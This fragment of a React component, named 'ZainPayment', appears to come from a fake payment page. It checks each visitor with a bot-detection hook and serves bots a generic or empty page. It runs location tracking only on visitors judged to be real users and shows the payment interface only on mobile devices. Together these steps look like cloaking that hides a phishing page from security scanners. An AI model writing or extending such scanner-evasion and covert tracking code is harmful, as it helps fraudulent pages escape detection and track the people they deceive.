...
import { useBotDetection } from "@/lib/use-bot-detection"
...
export default function ZainPayment() {
  ...
  useEffect(() => {
    // Only run location tracking for real users, not bots
    if (!isBot) {
      getLocation().then(() => {})
    }
  }, [isBot])
  ...
  // If it's a bot, show a generic page or nothing at all
  if (isBot) {
    return (
  ...
  // If not mobile, show a message instead of the payment interface
  if (!isMobile) {
    return (
